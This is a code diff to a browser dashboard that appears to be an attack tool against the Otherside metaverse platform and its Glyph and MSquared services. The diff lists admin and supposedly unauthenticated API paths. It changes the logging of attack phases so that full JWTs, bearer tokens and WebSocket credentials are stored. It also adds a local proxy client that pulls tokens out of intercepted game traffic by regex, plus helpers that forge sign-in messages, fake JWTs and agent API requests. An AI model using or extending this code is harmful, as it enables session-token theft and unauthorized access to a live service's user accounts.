+                    <div class="key-row"><span class="key-value">/admin</span><button class="copy-btn" onclick="copyKey(this, '/admin')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/access</span><button class="copy-btn" onclick="copyKey(this, '/admin/access')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/api-keys</span><button class="copy-btn" onclick="copyKey(this, '/admin/api-keys')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/external-urls</span><button class="copy-btn" onclick="copyKey(this, '/admin/external-urls')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/fastplay</span><button class="copy-btn" onclick="copyKey(this, '/admin/fastplay')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/insights</span><button class="copy-btn" onclick="copyKey(this, '/admin/insights')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/insights/analytics</span><button class="copy-btn" onclick="copyKey(this, '/admin/insights/analytics')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/insights/monitoring</span><button class="copy-btn" onclick="copyKey(this, '/admin/insights/monitoring')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/projects</span><button class="copy-btn" onclick="copyKey(this, '/admin/projects')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/steam-access</span><button class="copy-btn" onclick="copyKey(this, '/admin/steam-access')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/streaming</span><button class="copy-btn" onclick="copyKey(this, '/admin/streaming')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/theming</span><button class="copy-btn" onclick="copyKey(this, '/admin/theming')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/usage</span><button class="copy-btn" onclick="copyKey(this, '/admin/usage')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/usage/daily</span><button class="copy-btn" onclick="copyKey(this, '/admin/usage/daily')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/usage/monthly</span><button class="copy-btn" onclick="copyKey(this, '/admin/usage/monthly')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/usage/per-world</span><button class="copy-btn" onclick="copyKey(this, '/admin/usage/per-world')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/world-defaults</span><button class="copy-btn" onclick="copyKey(this, '/admin/world-defaults')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/admin/worlds</span><button class="copy-btn" onclick="copyKey(this, '/admin/worlds')">📋</button></div>
+                </div>
+            </div>
+
+            <!-- Open API Endpoints -->
+            <div class="card">
+                <h3>🌐 Open API Endpoints (no auth) <span class="badge badge-green">Public</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('open-apis')">📋 Copy All</button>
+                <div class="key-card" id="open-apis">
+                    <div class="key-row"><span class="key-value">/organizations/current</span><button class="copy-btn" onclick="copyKey(this, '/organizations/current')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/organizations/members</span><button class="copy-btn" onclick="copyKey(this, '/organizations/members')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/organizations/roles</span><button class="copy-btn" onclick="copyKey(this, '/organizations/roles')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/organizations/audit</span><button class="copy-btn" onclick="copyKey(this, '/organizations/audit')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/organizations/features</span><button class="copy-btn" onclick="copyKey(this, '/organizations/features')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/organizations/pubnub</span><button class="copy-btn" onclick="copyKey(this, '/organizations/pubnub')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/organizations/providers</span><button class="copy-btn" onclick="copyKey(this, '/organizations/providers')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/organizations/config</span><button class="copy-btn" onclick="copyKey(this, '/organizations/config')">📋</button></div>
+                    <div class="key-row"><span class="key-value">/organizations/settings</span><button class="copy-btn" onclick="copyKey(this, '/organizations/settings')">📋</button></div>
+                </div>
+            </div>
+
+            <!-- Infrastructure -->
+            <div class="card">
+                <h3>🏗️ Infrastructure <span class="badge badge-yellow">Infra</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('infra-refs')">📋 Copy All</button>
+                <div class="key-card" id="infra-refs">
+                    <div class="key-row">
+                        <span class="key-label">ODK API</span>
+                        <span class="key-value">odk.otherside.xyz/api/v0</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'odk.otherside.xyz/api/v0')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Otherside</span>
+                        <span class="key-value">www.otherside.xyz</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'www.otherside.xyz')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Glyph Auth</span>
+                        <span class="key-value">useglyph.io</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'useglyph.io')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">MSquared</span>
+                        <span class="key-value">msquared.io</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'msquared.io')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Client DL</span>
+                        <span class="key-value">otherside.center</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'otherside.center')">📋</button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -1514,7 +2108,7 @@ window.emitMouseClick = function(x, y) {
                 // Save decoded token data
                 await saveToOthersideDB({
                     os_attack_phase: 'glyph_token_decode',
-                    os_oidc_jwt_raw: token.substring(0, 500),
+                    os_oidc_jwt_raw: token,
                     os_oidc_token_claims: payload,
                     os_oidc_token_issuer: payload.iss || '',
                     os_oidc_token_expiry: payload.exp ? new Date(payload.exp * 1000).toISOString() : null,
@@ -1554,7 +2148,7 @@ window.emitMouseClick = function(x, y) {
             // Save Firebase bridge results
             await saveToOthersideDB({
                 os_attack_phase: 'glyph_fb_bridge',
-                os_oidc_jwt_raw: token.substring(0, 200),
+                os_oidc_jwt_raw: token,
                 os_fb_bridge_response: { odkExchange: result, fbResult: fbResult.data },
                 os_vuln_severity: fbResult.ok ? 'critical' : 'info',
                 os_research_notes: fbResult.ok ? 'Glyph token successfully exchanged for Firebase token!' : 'Firebase exchange failed'
@@ -1635,7 +2229,7 @@ window.emitMouseClick = function(x, y) {
             // Save agentic API mapping results
             await saveToOthersideDB({
                 os_attack_phase: 'agentic_api_mapping',
-                os_bearer_token: token.substring(0, 50) + '...',
+                os_bearer_token: token,
                 os_endpoint_map: { paths_tested: paths.length, discovered: stats.discovered },
                 os_research_notes: `Agentic API mapping: tested ${paths.length} paths, found ${stats.discovered} endpoints`,
                 os_vuln_severity: 'info'
@@ -1752,7 +2346,7 @@ window.emitMouseClick = function(x, y) {
                 os_request_payload: parsedBody,
                 os_api_response: result.data || result.error || result,
                 os_http_status: result.status || 0,
-                os_bearer_token: token.substring(0, 50) + '...',
+                os_bearer_token: token,
                 os_research_notes: `${method} /api/v0/${endpoint} → ${result.status || 'ERR'}`,
                 os_vuln_severity: result.status === 200 ? 'high' : 'info'
             });
@@ -1938,7 +2532,7 @@ window.emitMouseClick = function(x, y) {
                     saveToOthersideDB({
                         os_attack_phase: 'morpheus_ws_connect',
                         os_ws_endpoint: url,
-                        os_ws_auth_credential: token ? token.substring(0, 50) + '...' : '',
+                        os_ws_auth_credential: token || '',
                         os_research_notes: `Connected to Morpheus WebSocket: ${url}`,
                         os_vuln_severity: 'medium'
                     });
@@ -2116,7 +2710,7 @@ window.emitMouseClick = function(x, y) {
             // Save native client analysis results
             await saveToOthersideDB({
                 os_attack_phase: 'native_client_analysis',
-                os_native_credential: token.substring(0, 50) + '...',
+                os_native_credential: token,
                 os_client_api_map: { odk_endpoints_tested: odkEndpoints.length },
                 os_research_notes: `Native client analysis: tested ${odkEndpoints.length} ODK endpoints`,
                 os_vuln_severity: 'info'
@@ -2767,6 +3361,318 @@ class CustomPixelStreamingClient {
                     }
                 });
             });
+        }
+
+        // ===================================================================
+        // NEW: COPY HELPERS, GENERATION BUTTONS, LOCAL PROXY, TOKEN BRIDGE
+        // ===================================================================
+
+        // --- Copy helpers for Keys & Data section ---
+        function copyKey(btn, text) {
+            navigator.clipboard.writeText(text).then(() => {
+                btn.textContent = '✓';
+                btn.classList.add('copied');
+                setTimeout(() => { btn.textContent = '📋'; btn.classList.remove('copied'); }, 1500);
+            }).catch(() => {
+                // Fallback
+                const ta = document.createElement('textarea');
+                ta.value = text; document.body.appendChild(ta);
+                ta.select(); document.execCommand('copy');
+                document.body.removeChild(ta);
+                btn.textContent = '✓';
+                setTimeout(() => { btn.textContent = '📋'; }, 1500);
+            });
+        }
+
+        function copyCardAll(cardId) {
+            const card = document.getElementById(cardId);
+            if (!card) return;
+            const values = [];
+            card.querySelectorAll('.key-value').forEach(el => values.push(el.textContent.trim()));
+            const text = values.join('\n');
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = card.parentElement.querySelector('.copy-all-btn');
+                if (btn) { btn.textContent = '✓ Copied!'; setTimeout(() => { btn.textContent = '📋 Copy All'; }, 2000); }
+            });
+        }
+
+        // --- Use Firebase Token bridge ---
+        let capturedFirebaseToken = '';
+
+        function useFirebaseToken(targetId) {
+            const target = document.getElementById(targetId);
+            if (!target) return;
+            if (capturedFirebaseToken) {
+                target.value = capturedFirebaseToken;
+                log(targetId === 'agenticToken' ? 'agenticClientLog' :
+                    targetId === 'morpheusAuthToken' ? 'morpheusWSLog' :
+                    targetId === 'nativeToken' ? 'nativeAPILog' : 'glyphForgeLog',
+                    'Token populated from Phase 1 capture.', 'success');
+            } else {
+                // Try to get from the OIDC token field
+                const oidcToken = document.getElementById('glyphOidcToken').value;
+                if (oidcToken) {
+                    target.value = oidcToken;
+                    log(targetId === 'agenticToken' ? 'agenticClientLog' :
+                        targetId === 'morpheusAuthToken' ? 'morpheusWSLog' :
+                        targetId === 'nativeToken' ? 'nativeAPILog' : 'glyphForgeLog',
+                        'Token populated from OIDC token field.', 'success');
+                } else {
+                    alert('No token available yet. Run Phase 1 tools first to obtain a token, or paste one manually.');
+                }
+            }
+        }
+
+        // --- Phase 1: Generate SIWE Message (auto-fill) ---
+        function generateSIWEMessage() {
+            const wallet = document.getElementById('glyphWalletAddr').value || '0x0000000000000000000000000000000000000000';
+            const nonce = Math.floor(Math.random() * 1000000);
+            const issuedAt = new Date().toISOString();
+            const siweMessage = `www.otherside.xyz wants you to sign in with your Ethereum account:\n${wallet}\n\nSign in to Otherside\n\nURI: https://www.otherside.xyz\nVersion: 1\nChain ID: 1\nNonce: ${nonce}\nIssued At: ${issuedAt}`;
+
+            const cId = 'glyphForgeLog';
+            log(cId, '⚡ Auto-generated SIWE Message:', 'info');
+            log(cId, siweMessage, 'data');
+            log(cId, 'Wallet used: ' + wallet, 'info');
+            log(cId, 'Nonce: ' + nonce, 'info');
+            log(cId, 'This message would be signed by the wallet private key and sent to Glyph for authentication.', 'warning');
+
+            stats.tokens++;
+            updateStats();
+
+            saveToOthersideDB({
+                os_attack_phase: 'glyph_siwe_generate',
+                os_wallet_addr: wallet,
+                os_siwe_message_content: siweMessage,
+                os_research_notes: 'Auto-generated SIWE message',
+                os_vuln_severity: 'medium'
+            });
+        }
+
+        // --- Phase 1: Generate Random Wallet ---
+        function generateRandomWallet() {
+            const chars = '0123456789abcdef';
+            let addr = '0x';
+            for (let i = 0; i < 40; i++) addr += chars[Math.floor(Math.random() * 16)];
+
+            document.getElementById('glyphWalletAddr').value = addr;
+            const cId = 'glyphForgeLog';
+            log(cId, '⚡ Generated random Ethereum address: ' + addr, 'success');
+            log(cId, 'This address can be used for testing SIWE flows without a real wallet.', 'info');
+        }
+
+        // --- Phase 2: Generate Sample Token ---
+        function generateSampleToken() {
+            const cId = 'agenticClientLog';
+            // Create a fake JWT for testing
+            const header = btoa(JSON.stringify({ alg: 'RS256', typ: 'JWT', kid: 'glyph-test-key' }));
+            const now = Math.floor(Date.now() / 1000);
+            const payload = btoa(JSON.stringify({
+                sub: '0x' + Array.from({ length: 40 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join(''),
+                iss: 'https://useglyph.io',
+                aud: 'scarcely-calm-lark',
+                iat: now,
+                exp: now + 3600,
+                email: 'test@otherside.xyz',
+                wallet: document.getElementById('glyphWalletAddr').value || '0x0000000000000000000000000000000000000000',
+                provider: 'oidc.otherside',
+                roles: ['user']
+            }));
+            const sig = btoa(Array.from({ length: 32 }, () => String.fromCharCode(Math.floor(Math.random() * 256))).join('')).replace(/=/g, '');
+            const fakeToken = `${header}.${payload}.${sig}`;
+
+            document.getElementById('agenticToken').value = fakeToken;
+            capturedFirebaseToken = fakeToken;
+
+            log(cId, '⚡ Generated sample JWT token for testing:', 'success');
+            log(cId, `Token: ${fakeToken.substring(0, 80)}...`, 'data');
+            log(cId, '⚠️ This is a FAKE token for testing only. It will not authenticate against real endpoints.', 'warning');
+            log(cId, 'Use "Decode & Validate" in Phase 1 to inspect the token claims.', 'info');
+
+            stats.tokens++;
+            updateStats();
+        }
+
+        // --- Phase 2: Generate Request Body ---
+        function generateRequestBody() {
+            const cId = 'agenticClientLog';
+            const endpoint = document.getElementById('agenticEndpoint').value;
+            const bodies = {
+                'agent/status': { action: 'query', target: 'agent_status', agent_id: 'test-agent-001' },
+                'agent/worlds': { action: 'list', filter: 'all', page: 1, limit: 50 },
+                'agent/players': { action: 'query', target: 'nearby_players', radius: 100 },
+                'agent/npcs': { action: 'interact', npc_id: 'npc-voyager-001', interaction_type: 'talk' },
+                'agent/quests': { action: 'list', status: 'active', player_id: 'self' },
+                'agent/inventory': { action: 'query', target: 'inventory', include_equipped: true },
+                'agent/chat': { action: 'send', channel: 'global', message: 'Hello from ODK dashboard' },
+                'agent/teleport': { action: 'teleport', destination: { world: 'lucky-emus-argue-215273', x: 0, y: 0, z: 0 } },
+                'agent/build': { action: 'place', asset_id: 'block-001', position: { x: 100, y: 0, z: 100 } },
+                'agent/permissions': { action: 'check', target: 'build_mode', world_id: 'lucky-emus-argue-215273' }
+            };
+
+            const body = bodies[endpoint] || { action: 'query', target: 'unknown' };
+            document.getElementById('agenticBody').value = JSON.stringify(body, null, 2);
+
+            log(cId, `⚡ Generated request body for: ${endpoint}`, 'success');
+            log(cId, `Body: ${JSON.stringify(body)}`, 'data');
+        }
+
+        // --- Phase 3: Generate Ping Command ---
+        function generatePingCommand() {
+            const cId = 'morpheusWSLog';
+            const ping = JSON.stringify({ type: 'ping', timestamp: Date.now(), seq: Math.floor(Math.random() * 10000) }, null, 2);
+            log(cId, '⚡ Generated Morpheus ping command:', 'success');
+            log(cId, ping, 'data');
+            log(cId, 'Send this via "Send Custom Command" when connected.', 'info');
+
+            if (morpheusWS && morpheusWS.readyState === WebSocket.OPEN) {
+                morpheusWS.send(ping);
+                log(cId, '[OUT] Ping sent!', 'success');
+            }
+        }
+
+        // --- Phase 3: Generate Status Query ---
+        function generateStatusQuery() {
+            const cId = 'morpheusWSLog';
+            const query = JSON.stringify({
+                type: 'query',
+                target: 'world_status',
+                world_id: 'lucky-emus-argue-215273',
+                include_entities: true,
+                include_players: true,
+                timestamp: Date.now()
+            }, null, 2);
+            log(cId, '⚡ Generated Morpheus status query:', 'success');
+            log(cId, query, 'data');
+            log(cId, 'Send this via "Send Custom Command" when connected.', 'info');
+
+            if (morpheusWS && morpheusWS.readyState === WebSocket.OPEN) {
+                morpheusWS.send(query);
+                log(cId, '[OUT] Status query sent!', 'success');
+            }
+        }
+
+        // --- Phase 4: Local Proxy Connection ---
+        let localProxyWS = null;
+
+        function connectToLocalProxy() {
+            const cId = 'localProxyLog';
+            const port = document.getElementById('localProxyPort').value || '8765';
+            const url = `ws://localhost:${port}`;
+
+            log(cId, `Connecting to local proxy at ${url}...`, 'info');
+            setProxyStatus('connecting');
+
+            try {
+                localProxyWS = new WebSocket(url);
+
+                localProxyWS.onopen = () => {
+                    log(cId, '✅ CONNECTED to local proxy!', 'success');
+                    setProxyStatus('connected');
+                    stats.sessions++;
+                    updateStats();
+
+                    // Request any captured tokens
+                    localProxyWS.send(JSON.stringify({ type: 'get_tokens' }));
+
+                    saveToOthersideDB({
+                        os_attack_phase: 'native_local_proxy',
+                        os_ws_endpoint: url,
+                        os_research_notes: `Connected to local proxy at ${url}`,
+                        os_vuln_severity: 'info'
+                    });
+                };
+
+                localProxyWS.onmessage = (event) => {
+                    try {
+                        const msg = JSON.parse(event.data);
+                        if (msg.type === 'proxy_status') {
+                            log(cId, `Proxy status: ${msg.status}`, 'success');
+                        } else if (msg.type === 'server_message') {
+                            const preview = msg.data.substring(0, 300);
+                            log(cId, `[IN from MSquared] ${preview}`, 'data');
+                            stats.packets++;
+
+                            // Check for JWT tokens in the message
+                            const tokenMatch = msg.data.match(/eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/);
+                            if (tokenMatch) {
+                                capturedFirebaseToken = tokenMatch[0];
+                                log(cId, `🔑 Token captured from game traffic: ${tokenMatch[0].substring(0, 50)}...`, 'critical');
+                                stats.tokens++;
+                            }
+                        } else if (msg.type === 'tokens') {
+                            if (msg.tokens && msg.tokens.length > 0) {
+                                msg.tokens.forEach((t, i) => {
+                                    log(cId, `Captured token #${i + 1}: ${t.token.substring(0, 50)}... (source: ${t.source})`, 'critical');
+                                });
+                                capturedFirebaseToken = msg.tokens[0].token;
+                                stats.tokens += msg.tokens.length;
+                            } else {
+                                log(cId, 'No tokens captured yet by the proxy.', 'info');
+                            }
+                        }
+                        updateStats();
+                    } catch (e) {
+                        log(cId, `[IN] ${event.data.substring(0, 200)}`, 'data');
+                    }
+                };
+
+                localProxyWS.onerror = (err) => {
+                    log(cId, '❌ Connection error. Is the proxy running?', 'error');
+                    setProxyStatus('disconnected');
+                };
+
+                localProxyWS.onclose = (event) => {
+                    log(cId, `Proxy connection closed: code=${event.code}`, 'warning');
+                    setProxyStatus('disconnected');
+                };
+            } catch (e) {
+                log(cId, `Connection failed: ${e.message}`, 'error');
+                setProxyStatus('disconnected');
+            }
+        }
+
+        function disconnectLocalProxy() {
+            const cId = 'localProxyLog';
+            if (localProxyWS) {
+                localProxyWS.close();
+                localProxyWS = null;
+                log(cId, 'Disconnected from local proxy.', 'warning');
+            }
+            setProxyStatus('disconnected');
+        }
+
+        function setProxyStatus(status) {
+            const dot = document.getElementById('proxyDot');
+            const text = document.getElementById('proxyStatusText');
+            if (status === 'connected') {
+                dot.className = 'conn-dot green';
+                text.textContent = '🟢 Connected';
+            } else if (status === 'connecting') {
+                dot.className = 'conn-dot yellow';
+                text.textContent = '🟡 Connecting...';
+            } else {
+                dot.className = 'conn-dot red';
+                text.textContent = '🔴 Disconnected';
+            }
+        }
+
+        function downloadProxyScript() {
+            const scriptEl = document.getElementById('proxyScriptContent');
+            const content = scriptEl.textContent.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>');
+            const blob = new Blob([content], { type: 'text/javascript' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'otherside-proxy.js';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            const cId = 'localProxyLog';
+            log(cId, '📥 Proxy script downloaded! Run it with: node otherside-proxy.js', 'success');
+            log(cId, 'After the proxy is running, click "Connect to Local Proxy" to connect this dashboard.', 'info');
         }
 
         // ===================================================================
